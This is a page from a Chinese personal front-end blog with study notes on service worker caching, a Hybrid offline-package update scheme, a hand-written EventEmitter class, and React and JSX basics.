<p>1.注册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//在页面文件注册</span><br><span class="line">if (navigator.serviceWorker) &#123;</span><br><span class="line">        // 注册Service Worker scope表示作用的页面的path</span><br><span class="line">        // register函数返回Promise</span><br><span class="line">        navigator.serviceWorker.register(&apos;./service-worker.js&apos;, &#123;scope: &apos;./&apos;&#125;)</span><br><span class="line">            .then(function (registration) &#123;</span><br><span class="line">                console.log(registration);</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(function (e) &#123;</span><br><span class="line">                console.error(e);</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.log(&apos;Service Worker is not supported in this browser.&apos;)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>上面的代码检查 service worker API 是否可用，如果可用， /service-worker.js 这个文件将会作为 service worker 被注册。<br>scope表示作用的页面的path</p>
<p>2.安装使用<br>service-worker.js文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">importScripts(&apos;js/cache-polyfill.js&apos;); // cache 扩展</span><br><span class="line"></span><br><span class="line">var CACHE_VERSION = &apos;app-v1&apos;; // 缓存文件的版本</span><br><span class="line">var CACHE_FILES = [ // 需要缓存的页面文件</span><br><span class="line">    &apos;/&apos;,</span><br><span class="line">    &apos;images/background.jpeg&apos;,</span><br><span class="line">    &apos;js/app.js&apos;,</span><br><span class="line">    &apos;css/styles.css&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;install&apos;, function (event) &#123; // 监听worker的install事件</span><br><span class="line">    event.waitUntil( // 延迟install事件直到缓存初始化完成</span><br><span class="line">        caches.open(CACHE_VERSION) //开启一个缓存</span><br><span class="line">            .then(function (cache) &#123;</span><br><span class="line">                console.log(&apos;Opened cache&apos;);</span><br><span class="line">                return cache.addAll(CACHE_FILES); //缓存文件</span><br><span class="line">                //这个过程是通过一连串 promise （caches.open 和 cache.addAll）完成的。</span><br><span class="line">                //event.waitUntil 会拿到一个 promise ，并使用其来获取安装耗费的时间以及是否安装成功。</span><br><span class="line">                //如果所有的文件都缓存成功，service worker 就安装成功了。</span><br><span class="line">                //如果任何一个文件下载失败，那么安装步骤就会失败。这个方式依赖于自己指定的资源，但这意味着，需要非常仔细地确定哪些文件需要被缓存。</span><br><span class="line">                //指定了太多文件的话，会增加失败率</span><br><span class="line">                //可以在 install 事件中执行其他操作，甚至忽略 install 事件</span><br><span class="line">            &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, function (event) &#123; // 监听worker的activate事件,正在激活状态会触发该事件，更新service worker时，也会触发</span><br><span class="line">    event.waitUntil( // 延迟activate事件直到</span><br><span class="line">        caches.keys().then(function(keys)&#123;</span><br><span class="line">            return Promise.all(keys.map(function(key, i)&#123; // 清除旧版本缓存</span><br><span class="line">                if(key !== CACHE_VERSION)&#123;</span><br><span class="line">                    return caches.delete(keys[i]);</span><br><span class="line">                    //需要在 activate 的 callback 中进行 cache 管理，来清理老的 cache。</span><br><span class="line">                    //在 activate 而不是 install 的时候进行的原因，是如果在 install 的时候进行清理，</span><br><span class="line">                    //那么老的 service worker 仍然在控制页面，他们依赖的缓存就失效了，因此就会突然被停止</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;))</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123; // 截取页面的资源请求</span><br><span class="line">    event.respondWith( // 返回页面的资源请求</span><br><span class="line">        caches.match(event.request).then(function(res)&#123; // 判断缓存是否命中</span><br><span class="line">            if(res)&#123;  // 返回缓存中的资源</span><br><span class="line">                return res;</span><br><span class="line">            &#125;</span><br><span class="line">            requestBackend(event); // 执行请求备份操作</span><br><span class="line">        &#125;)</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function requestBackend(event)&#123;  // 请求备份操作</span><br><span class="line">    var url = event.request.clone();</span><br><span class="line">    return fetch(url).then(function(res)&#123; // 请求线上资源</span><br><span class="line">        //if not a valid response send the error</span><br><span class="line">        //确保 response 有效</span><br><span class="line">				//检查 response 的状态是200</span><br><span class="line">				//确保 response 的类型是 basic 类型的，这说明请求是同源的，这意味着第三方的请求不能被缓存。</span><br><span class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line">            return res;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var response = res.clone();</span><br><span class="line">        //如果检查通过会clone 这个请求。</span><br><span class="line">        //这么做的原因是如果 response 是一个 Stream，那么它的 body 只能被消费一次。</span><br><span class="line">        //所以为了让浏览器跟缓存都使用这个body,必须克隆这个 body，一份到浏览器，一份到缓存中缓存</span><br><span class="line"></span><br><span class="line">        caches.open(CACHE_VERSION).then(function(cache)&#123; // 缓存从线上获取的资源</span><br><span class="line">            cache.put(event.request, response);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        return res;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>service worker 更新步骤：<br>1.更新 service worker 的 JavaScript 文件<br>  当用户浏览你的网站时，浏览器尝试在后台重新下载 service worker 的脚本文件。<br>  经过对比，只要服务器上的文件和本地文件有一个字节不同，这个文件就认为是新的。<br>2.之后更新后的 service worker 启动并触发 install 事件。<br>3.此时，当前页面生效的依然是老版本的 service worker，新的 service worker 会进入 “waiting” 状态。<br>4.当页面关闭之后，老的 service worker 会被干掉，新的 servicer worker 接管页面<br>5.一旦新的 service worker 生效后会触发 activate 事件。</p>
<p>关于 service worker 的一些注意点：<br>1.service worker 是一个JavaScript worker ,所以它不能直接访问 DOM 。相反, service worker 可以通过postMessage 接口与跟其相关的页面进行通信,发送消息,从而让这些页面在有需要的时候去操纵 DOM 。<br>2.Service worker 是一个可编程的网络代理，允许你去控制如何处理页面的网络请求。<br>3.Service worker 在不使用时将被终止，并会在需要的时候重新启动，因此你不能把onfetch 和 onmessage事件来作为全局依赖处理程序。如果你需要持久话一些信息并在重新启动Service worker后使用他，可以使用 IndexedDBAPI ，service worker 支持。 　　<br>4.Service worker 广泛使用了 promise<br>缺点：<br>如果安装失败了，没有一个很好的方式来知晓<br>fetch api()目前仅支持Service Workers中使用<br>fetch() 中不会被触发重定向<br>页面在改变 hash 时，service worker 会停止工作</p>
<p><a href="https://segmentfault.com/a/1190000006061528" target="_blank" rel="noopener">Service Worker 生命周期</a><br><a href="https://zhuanlan.zhihu.com/p/20040372" target="_blank" rel="noopener">Service Worker那些事</a><br><a href="https://zhuanlan.zhihu.com/p/27264234" target="_blank" rel="noopener">深入了解 Service Worker</a><br><a href="http://www.alloyteam.com/2016/01/9274/" target="_blank" rel="noopener">Service Worker初体验</a><br><a href="https://serviceworke.rs/" target="_blank" rel="noopener">serviceworke Introduction</a></p>
<h2 id="离线缓存之-Hybrid-Cache离线包"><a href="#离线缓存之-Hybrid-Cache离线包" class="headerlink" title="离线缓存之 Hybrid Cache离线包"></a>离线缓存之 Hybrid Cache离线包</h2><p>前端开发”就是使用 HTML、CSS、JS 技术给一个网站或 Web 应用开发图形用户界面<br>所以，前端应用本质上一个 GUI 程序，而 GUI 程序有三种典型形态：<br>Web : 以浏览器为运行环境，基于浏览器内核支持的编程语言、API 来实现，被浏览器解释执行<br>Native : 以操作系统为运行环境，基于操作系统原生支持的编程语言、API 接口实现，以二进制包的形式运行<br>Hybird : 基于 Native 应用提供的一个支持 HTML、CSS、JS 的容器开发的应用，相当与用开发 Web 的方式开发 Native 应用</p>
<p>原理：<br>1.o2o 在线资源抓取程序：基于 phantomjs 解析资源<br>2.grunt-inc-offline 增量包计算器：基于 git-diff 的增量包运算<br>3.离线包生成器<br><img src="/image/CACHE1.png" alt="CACHE1"><br>1.o2o 定时程序监听线上页面变更，将其所携带的资源（HTML、CSS、JS 和部分图片）抓取下来<br>2.增量包计算器会计算好与之前若干版本之间的增量文件，配合包生成器将增量包逐一构建打包，同时生成好每个增量包的 Diff Json<br>3.调用 Clam 命令通过 Gitlab 将资源包部署至 CDN，以备手机端更新。<br>4.Gitlab 仓库 的更新会触发一个 Hook 脚本，调用 tSync 服务器的接口，来通知资源变更<br>5.tSync 服务器沙箱完成消息封装，包括了第二步生成了的 Diff Json 文本<br>6.tSync 长连接将消息指令下发给手机终端<br>7.手机终端拼好资源文件链接，从 CDN 将增量包更新下来，随后执行 Diff Json中的指令，完成包的更新。</p>
<p>手机端的两个重要进程：</p>
<p>1.资源预加载进程：在实际访问页面之前，将资源预加载到缓存池并更新 Cache Map<br>2.创建 WebView 进程：只聚焦本地资源读写，别的什么也不干<br>手机端 touch 到网络的环节收敛到了两处，第一，Package Update Controller，第二，WebView 本身必要的网络请求<br><img src="/image/CACHE2.png" alt="CACHE2"><br><a href="https://yq.aliyun.com/articles/2939" target="_blank" rel="noopener">相关链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/react/EventEmitter.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/react/EventEmitter.html" itemprop="url">
                  实现一个 EventEmitter
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-21T21:07:02+08:00">
                2017-10-21
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="实现一个-EventEmitter"><a href="#实现一个-EventEmitter" class="headerlink" title="实现一个 EventEmitter"></a>实现一个 EventEmitter</h1><p>EventEmitter 模块，它是一个类，它的实例具有以下几个方法：on、emit、off：<br>on(eventName, func)：监听 eventName 事件，事件触发的时候调用 func 函数。<br>emit(eventName, arg1, arg2, arg3…)：触发 eventName 事件，并且把参数 arg1, arg2, arg3… 传给事件处理函数。<br>off(eventName, func)：停止监听某个事件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">class EventEmitter &#123;</span><br><span class="line">  /* TODO */</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.listeners = [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on(eventName, func)&#123;</span><br><span class="line">    for(let i=0;i&lt;this.listeners.length;i++)&#123;</span><br><span class="line">      if(this.listeners[i].name === eventName)&#123;</span><br><span class="line">          this.listeners[i].funcs.push(func);</span><br><span class="line">          return</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    this.listeners.push(&#123;</span><br><span class="line">      name:eventName,</span><br><span class="line">      funcs:[]</span><br><span class="line">    &#125;)</span><br><span class="line">    this.listeners[this.listeners.length-1].funcs.push(func)</span><br><span class="line">  &#125;</span><br><span class="line">  emit(eventName, ...args)&#123;</span><br><span class="line">    for(let j=0;j&lt;this.listeners.length;j++)&#123;</span><br><span class="line">        if(this.listeners[j].name === eventName)&#123;</span><br><span class="line">            for(let k =0;k&lt;this.listeners[j].funcs.length;k++)&#123;</span><br><span class="line">              this.listeners[j].funcs[k](args)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  off(eventName, func)&#123;</span><br><span class="line">      for(let j=0;j&lt;this.listeners.length;j++)&#123;</span><br><span class="line">        if(this.listeners[j].name === eventName)&#123;</span><br><span class="line">          if(func == undefined)&#123; //整个事件不再监听</span><br><span class="line">            this.listeners.splice(j,1);</span><br><span class="line">           &#125;</span><br><span class="line">          for(let k =0;k&lt;this.listeners[j].funcs.length;k++)&#123;</span><br><span class="line">                if(func === this.listeners[j].funcs[k])&#123;</span><br><span class="line">                  this.listeners[j].funcs.splice(k,1);</span><br><span class="line">                  return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const emitter = new EventEmitter()</span><br><span class="line">const sayHi = (name) =&gt; console.log(`Hello $&#123;name&#125;`)</span><br><span class="line">const sayHi2 = (name) =&gt; console.log(`Good night, $&#123;name&#125;`)</span><br><span class="line"></span><br><span class="line">emitter.on(&apos;hi&apos;, sayHi)</span><br><span class="line">emitter.on(&apos;hi&apos;, sayHi2)</span><br><span class="line">emitter.on(&apos;hi2&apos;, sayHi)</span><br><span class="line">emitter.on(&apos;hi2&apos;, sayHi2)</span><br><span class="line">emitter.emit(&apos;hi&apos;, &apos;ScriptOJ&apos;)</span><br><span class="line">// =&gt; Hello ScriptOJ</span><br><span class="line">// =&gt; Good night, ScriptOJ</span><br><span class="line"></span><br><span class="line">emitter.off(&apos;hi&apos;, sayHi)</span><br><span class="line">emitter.emit(&apos;hi&apos;, &apos;ScriptOJ&apos;)</span><br><span class="line">emitter.emit(&apos;hi2&apos;, &apos;ScriptOJ&apos;)</span><br><span class="line"></span><br><span class="line">const emitter2 = new EventEmitter()</span><br><span class="line">emitter2.on(&apos;hi&apos;, (name, age) =&gt; &#123;</span><br><span class="line">  console.log(`I am $&#123;name&#125;, and I am $&#123;age&#125; years old`)</span><br><span class="line">&#125;)</span><br><span class="line">emitter2.emit(&apos;hi&apos;, &apos;Jerry&apos;, 12)</span><br></pre></td></tr></table></figure>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/react/react.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/react/react.html" itemprop="url">
                  react 简略学习笔记
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-09T06:37:02+08:00">
                2017-10-09
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>react.js是一个UI库,按照react规则，可以组建页面里每一小块的功能，这种局部的功能就是一个组件，<br>各组件之间可以组合、嵌套，从而拼成整个页面<br>react就是在组建各个尽可能通用的组件</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接使用官方工具 create-react-app<br>npm install -g create-react-app 安装命令行<br>create-react-app hello-react 构建工程<br>cd hello-react 进入工程<br>npm start 运行<br>src/App.js 即是编写组件的文件<br>一个简单的组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; Component &#125; from &apos;react&apos; //写组件必须要引入的依赖</span><br><span class="line">import ReactDOM from &apos;react-dom&apos; //把组件渲染到页面上去，就是把组件的html结构形成页面</span><br><span class="line">import &apos;./index.css&apos;</span><br><span class="line"></span><br><span class="line">class Header extends Component &#123;</span><br><span class="line">  render () &#123; //组件必须要有的函数，且必须要返回JSX</span><br><span class="line">    return ( //返回JSX写的组件内容</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;React 小书&lt;/h1&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//ReactDOM.render 功能就是把组件渲染并且构造 DOM 树，然后插入到页面上某个特定的元素上（在这里是 id 为 root 的 div 元素）。</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;Header /&gt;,</span><br><span class="line">  document.getElementById(&apos;root&apos;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>在编写 React.js 组件的时候，一般都需要继承 React.js 的 Component（也有别的编写组件的方式–&gt;函数式组件）。一个组件类必须要实现一个 render 方法，这个 render 方法必须要返回一个 JSX 元素。但这里要注意的是，</p>
<p>必须要用一个外层的 JSX 元素把所有内容包裹起来。返回并列多个 JSX 元素是不允许的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//不对的</span><br><span class="line">return (</span><br><span class="line">      &lt;div&gt;第一个&lt;/div&gt;</span><br><span class="line">      &lt;div&gt;第二个&lt;/div&gt;</span><br><span class="line">        )</span><br><span class="line">//对的</span><br><span class="line">return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;div&gt;第一个&lt;/div&gt;</span><br><span class="line">      &lt;div&gt;第二个&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br></pre></td></tr></table></figure></p>
<h1 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h1><p>可以把它看做是js的一种数据类型，长得很像HTML，但不是HTML,可以像html那样写，但有些地方要注意</p>
<p>可应用{}插入任何js代码，<br>如果是表达式函数，则返回的结果会相应地渲染到页面上，变量则将变量值对应渲染</p>
<p>{}内如果是条件表达式，即可以实现，根据不同条件返回不同jsx内容，<br>如果在表达式插入里面返回 null ，那么 React.js 会什么都不显示，相当于忽略了该表达式插入。结合条件返回的话，就做到显示或者隐藏某些元素</p>
<p>可以做变量的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">render () &#123;</span><br><span class="line">  const isGoodWord = true</span><br><span class="line">  const goodWord = &lt;strong&gt; is good&lt;/strong&gt;</span><br><span class="line">  const badWord = &lt;span&gt; is not good&lt;/span&gt;</span><br><span class="line">  const title = &lt;h1 className=&apos;title&apos;&gt; ScriptOJ &lt;/h1&gt;</span><br><span class="line">  const page = &lt;div className= &apos;content&apos;&gt; &#123;title&#125; &lt;/div&gt; //page里面用title的值，即 &lt;h1 className=&apos;title&apos;&gt; ScriptOJ &lt;/h1&gt;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;</span><br><span class="line">        React 小书</span><br><span class="line">        &#123;isGoodWord ? goodWord : badWord&#125;</span><br><span class="line">      &lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>给标签添加class时，不能用class,要用className<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">render () &#123;</span><br><span class="line">  const className = &apos;header&apos;</span><br><span class="line">  return (</span><br><span class="line">    &lt;div className=&#123;className&#125;&gt;</span><br><span class="line">      &lt;h1&gt;React 小书&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>for属性不能用，要用htmlfor代替，<br>其他的 HTML 属性例如 style 、data-* 等就可以像普通的 HTML 属性那样直接添加上去。</p>
<h1 id="组件树"><a href="#组件树" class="headerlink" title="组件树"></a>组件树</h1><p>通过继承Component可以自定义形成多个类,即形成多个组件，但这些组件名，<br>或者说类名要作为标签使用，为与普通小写字母开头的HTML标签做区分，一定要以大写字母开头</p>
<p>自定义组件以标签的形式放入另一个自定义组件的JSX中，即可实现包含关系<br>多个自定义标签组件并列放入同一个JSX中即实现并列关系<br>组件可以和组件组合在一起，组件内部可以使用别的组件，就像普通的 HTML 标签一样使用就可以<br>这样的组合嵌套，最后构成一个所谓的组件树</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import React, &#123; Component &#125; from &apos;react&apos;;</span><br><span class="line">import ReactDOM from &apos;react-dom&apos;;</span><br><span class="line"></span><br><span class="line">class Title extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;h1&gt;hello react&lt;/h1&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Header extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Title /&gt; //header里面包含Title</span><br><span class="line">      &lt;h2&gt;This is Header&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Main extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h2&gt;This is main content&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Footer extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h2&gt;This is footer&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Index extends Component &#123;</span><br><span class="line">  render () &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt; //多标签并列放置，组成页面</span><br><span class="line">        &lt;Header /&gt;</span><br><span class="line">        &lt;Main /&gt;</span><br><span class="line">        &lt;Footer /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">  &lt;Index /&gt;,</span><br><span class="line">  document.getElementById(&apos;root&apos;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
